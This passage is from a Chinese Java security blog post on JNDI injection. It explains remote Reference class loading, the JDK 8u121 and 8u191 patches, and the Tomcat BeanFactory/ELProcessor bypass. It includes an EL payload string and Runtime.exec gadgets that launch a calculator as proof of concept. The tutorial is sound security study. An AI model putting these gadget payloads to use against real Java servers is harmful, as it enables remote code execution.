+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">elPayload</span> <span class="operator">=</span> <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +</span><br><span class="line">        <span class="string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +</span><br><span class="line">        <span class="string">&quot;.eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261557696.png" alt="image-20260226155724616"></p>
+<h4 id="2-2、底层实现-1"><a href="#2-2、底层实现-1" class="headerlink" title="2.2、底层实现"></a>2.2、底层实现</h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261604117.png" alt="image-20260226160438053"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602261612512.png" alt="image-20260226161204393"></p>
+<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><h3 id="一、-起：JNDI-的本质与精妙设计"><a href="#一、-起：JNDI-的本质与精妙设计" class="headerlink" title="一、 起：JNDI 的本质与精妙设计"></a>一、 起：JNDI 的本质与精妙设计</h3><ul>
+<li><strong>核心定位：</strong> JNDI 是一个“智能路由器”和“大管家”。它的初衷是为了解耦，让 Java 应用能通过一个标准名称（Name）去外部（LDAP、RMI 目录）寻找并使用资源（如数据库连接池）</li>
+<li><strong>底层架构：</strong> 分为 API（开发者用）和 SPI（底层协议实现，如 <code>rmi://</code> 自动切 RMI，<code>ldap://</code> 自动切 LDAP）</li>
+<li><strong>伟大的发明——引用对象 (Reference)：</strong> 因为很多底层资源（如连接池）无法直接序列化传输，JNDI 发明了 Reference。它不传对象本身，只传**“图纸”**（<code>className</code>、<code>factoryClassName</code>、<code>factoryClassLocation</code>），让客户端拿到图纸后在本地自己造对象</li>
+</ul>
+<h3 id="二、-承：潘多拉魔盒的打开-传统-JNDI-注入"><a href="#二、-承：潘多拉魔盒的打开-传统-JNDI-注入" class="headerlink" title="二、 承：潘多拉魔盒的打开 (传统 JNDI 注入)"></a>二、 承：潘多拉魔盒的打开 (传统 JNDI 注入)</h3><ul>
+<li><strong>万恶之源：</strong> <code>NamingManager.getObjectInstance()</code>。当客户端去 <code>lookup</code> 一个恶意的 Reference 时，底层会根据图纸里的 <code>factoryClassLocation</code> 去<strong>远程 HTTP 服务器</strong>下载未知的 <code>.class</code> 文件</li>
+<li><strong>致命打击：</strong> JVM 只要一实例化这个远程下载来的工厂类（调用 <code>newInstance()</code>），就会触发类里面的静态代码块或构造方法，直接导致 RCE（远程代码执行），你的电脑就会被弹计算器</li>
+</ul>
+<h3 id="三、-转：Oracle-的围追堵截-补丁演进与协议差异"><a href="#三、-转：Oracle-的围追堵截-补丁演进与协议差异" class="headerlink" title="三、 转：Oracle 的围追堵截 (补丁演进与协议差异)"></a>三、 转：Oracle 的围追堵截 (补丁演进与协议差异)</h3><ul>
+<li><strong>JDK 8u121 (RMI 封杀)：</strong> 官方醒悟，把 <code>trustURLCodebase</code> 默认设为 <code>false</code>，强行禁止了 RMI 协议去远程下载工厂类</li>
+<li><strong>LDAP 的狂欢：</strong> 因为官方忘了补 LDAP 的漏，导致黑客把前缀换成 <code>ldap://</code> 继续横行霸道。且 LDAP 的 <code>bind</code> 和 RMI 不同，RMI 绑定是“活体对象驻留”（一直占着 1099 端口），LDAP 绑定是“数据入库”（一秒搞定退出），更适合黑客伪造</li>
+<li><strong>JDK 8u191 (全面封杀)：</strong> 官方终于把 LDAP 的远程下载开关也关上了，JNDI 注入的“外挂图纸”时代宣告终结</li>
+</ul>
+<h3 id="四、-合：绝地反击的黑魔法-本地-Factory-绕过"><a href="#四、-合：绝地反击的黑魔法-本地-Factory-绕过" class="headerlink" title="四、 合：绝地反击的黑魔法 (本地 Factory 绕过)"></a>四、 合：绝地反击的黑魔法 (本地 Factory 绕过)</h3><ul>
+<li><p><strong>核心思想：</strong> 既然不让从外面带杀手进来，那就找本地 Classpath 里的“内鬼”</p>
+</li>
+<li><p><strong>完美内鬼：</strong> Tomcat 自带的 <code>org.apache.naming.factory.BeanFactory</code></p>
+</li>
+<li><p><strong>攻击链条：</strong> 1. 构造一个恶意的 <code>ResourceRef</code>，不填远程地址（绕过 8u191 拦截）</p>
+<ol start="2">
+<li><p>利用 BeanFactory 的 <code>forceString</code> 危险特性，强行扭曲赋值逻辑</p>
+</li>
+<li><p>把恶意字符串（EL 表达式，如 <code>&quot;Runtime.getRuntime().exec(&#39;calc&#39;)&quot;</code> 或更高级的 JS 引擎桥接代码）强塞给 <code>javax.el.ELProcessor</code> 的 <code>eval</code> 方法去执行</p>
+</li>
+<li><p>达成<strong>纯本地依赖环境下的完美 RCE</strong></p>
+</li>
+</ol>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/">chuanchuan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/2026/02/26/JNDI_2/">https://zc-18.github.io/2026/02/26/JNDI_2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://zc-18.github.io/" target="_blank">十七.</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/JNDI/">JNDI</a></div><div class="post-share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/26/JNDI_1/" title="java安全-JNDI实现"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java安全-JNDI实现</div></div><div class="info-2"><div class="info-item-1">java安全中jndi学习，jndi的实现过程</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/26/JNDI_1/" title="java安全-JNDI实现"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-26</div><div class="info-item-2">java安全-JNDI实现</div></div><div class="info-2"><div class="info-item-1">java安全中jndi学习，jndi的实现过程</div></div></div></a><a class="pagination-related" href="/2025/12/13/fanxuliehau/" title="java安全-反序列化"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010125526.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-13</div><div class="info-item-2">java安全-反序列化</div></div><div class="info-2"><div class="info-item-1">java安全中反序列化初识别部分，java的大部分漏洞都与他有关。</div></div></div></a><a class="pagination-related" href="/2026/01/06/CC1-Chain/" title="java安全-CC1"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855419.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-06</div><div class="info-item-2">java安全-CC1</div></div><div class="info-2"><div class="info-item-1">java安全中CC1链，这个链是jdk8u71之前的漏洞，能达到getshell的效果。</div></div></div></a><a class="pagination-related" href="/2026/01/15/CC1_plus-chain/" title="java安全-CC1进阶"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-15</div><div class="info-item-2">java安全-CC1进阶</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC1_plus，主要分析了官方ysoserial的LazyMap链，并且研究了jdk8u71版本后CC1失效的原因</div></div></div></a><a class="pagination-related" href="/2026/01/28/CC2-Gadget/" title="java安全-CC2"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">java安全-CC2</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC2，在CC4逻辑上修改的后半段，没有使用数组的CC链。</div></div></div></a><a class="pagination-related" href="/2026/01/28/CC3-Gadget/" title="java安全-CC3"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191201.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">java安全-CC3</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC3，使用类加载的方式，实现RCE。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="author-info-name">chuanchuan</div><div class="author-info-description">慢吞吞的小孩也会有自己的玫瑰海.</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zc-18/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/zc-18/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/2401_87508420" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2890792376@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8-JNDI%E6%B3%A8%E5%85%A5"><span class="toc-text">java安全-JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81JNDI%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B"><span class="toc-text">一、JNDI引用类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%9E%E7%8E%B0"><span class="toc-text">1.实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B7%E4%BD%93%E9%80%BB%E8%BE%91"><span class="toc-text">2.具体逻辑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81JNDI%E6%B3%A8%E5%85%A5"><span class="toc-text">二、JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-poc%E5%AE%9E%E7%8E%B0"><span class="toc-text">1.poc实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BA%95%E5%B1%82%E9%80%BB%E8%BE%91"><span class="toc-text">2.底层逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">2.1、服务端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">2.2、客户端</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%80%BB%E7%BB%93"><span class="toc-text">3.总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87-8u121"><span class="toc-text">三、高版本绕过-8u121</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-jdk8u121%E4%BF%AE%E5%A4%8D%E7%82%B9"><span class="toc-text">1.jdk8u121修复点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1%E3%80%81%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="toc-text">1.1、版本问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1%E3%80%81%E5%85%B7%E4%BD%93%E9%80%BB%E8%BE%91"><span class="toc-text">1.1、具体逻辑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87"><span class="toc-text">2.绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E3%80%81poc"><span class="toc-text">2.1、poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2%E3%80%81%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0"><span class="toc-text">2.2、底层实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87-8u191"><span class="toc-text">四、高版本绕过-8u191</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-jdk8u191%E4%BF%AE%E5%A4%8D%E7%82%B9"><span class="toc-text">1.jdk8u191修复点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87-1"><span class="toc-text">2.绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E3%80%81%E4%B8%BB%E8%A6%81%E9%80%BB%E8%BE%91"><span class="toc-text">2.1、主要逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2%E3%80%81%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-1"><span class="toc-text">2.2、底层实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">五、总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E8%B5%B7%EF%BC%9AJNDI-%E7%9A%84%E6%9C%AC%E8%B4%A8%E4%B8%8E%E7%B2%BE%E5%A6%99%E8%AE%BE%E8%AE%A1"><span class="toc-text">一、 起：JNDI 的本质与精妙设计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-%E6%89%BF%EF%BC%9A%E6%BD%98%E5%A4%9A%E6%8B%89%E9%AD%94%E7%9B%92%E7%9A%84%E6%89%93%E5%BC%80-%E4%BC%A0%E7%BB%9F-JNDI-%E6%B3%A8%E5%85%A5"><span class="toc-text">二、 承：潘多拉魔盒的打开 (传统 JNDI 注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81-%E8%BD%AC%EF%BC%9AOracle-%E7%9A%84%E5%9B%B4%E8%BF%BD%E5%A0%B5%E6%88%AA-%E8%A1%A5%E4%B8%81%E6%BC%94%E8%BF%9B%E4%B8%8E%E5%8D%8F%E8%AE%AE%E5%B7%AE%E5%BC%82"><span class="toc-text">三、 转：Oracle 的围追堵截 (补丁演进与协议差异)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81-%E5%90%88%EF%BC%9A%E7%BB%9D%E5%9C%B0%E5%8F%8D%E5%87%BB%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95-%E6%9C%AC%E5%9C%B0-Factory-%E7%BB%95%E8%BF%87"><span class="toc-text">四、 合：绝地反击的黑魔法 (本地 Factory 绕过)</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/26/JNDI_2/" title="java安全-JNDI注入"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-JNDI注入"/></a><div class="content"><a class="title" href="/2026/02/26/JNDI_2/" title="java安全-JNDI注入">java安全-JNDI注入</a><time datetime="2026-02-26T10:00:01.000Z" title="发表于 2026-02-26 18:00:01">2026-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/26/JNDI_1/" title="java安全-JNDI实现"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-JNDI实现"/></a><div class="content"><a class="title" href="/2026/02/26/JNDI_1/" title="java安全-JNDI实现">java安全-JNDI实现</a><time datetime="2026-02-26T10:00:00.000Z" title="发表于 2026-02-26 18:00:00">2026-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/RMI_3/" title="java安全-RMI高版本绕过"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010120972.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-RMI高版本绕过"/></a><div class="content"><a class="title" href="/2026/02/21/RMI_3/" title="java安全-RMI高版本绕过">java安全-RMI高版本绕过</a><time datetime="2026-02-21T10:00:02.000Z" title="发表于 2026-02-21 18:00:02">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/RMI_2/" title="java安全-RMI攻击方式"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855419.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-RMI攻击方式"/></a><div class="content"><a class="title" href="/2026/02/21/RMI_2/" title="java安全-RMI攻击方式">java安全-RMI攻击方式</a><time datetime="2026-02-21T10:00:01.000Z" title="发表于 2026-02-21 18:00:01">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/RMI_1/" title="java安全-RMI调用逻辑"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan8.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-RMI调用逻辑"/></a><div class="content"><a class="title" href="/2026/02/21/RMI_1/" title="java安全-RMI调用逻辑">java安全-RMI调用逻辑</a><time datetime="2026-02-21T10:00:00.000Z" title="发表于 2026-02-21 18:00:00">2026-02-21</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-flex"></div><div class="footer-other"><div class="footer-copyright"><span class="copyright">© 2025 chuanchuan</span><br/><span class="footer-separator">|</span><span class="footer-slogan">我希望海浪喧嚣，
+让我听到我孤独的自由才好</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3-b2"></script><script src="/js/main.js?v=5.5.3-b2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索一下.." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3-b2"></script></div></div></body></html>
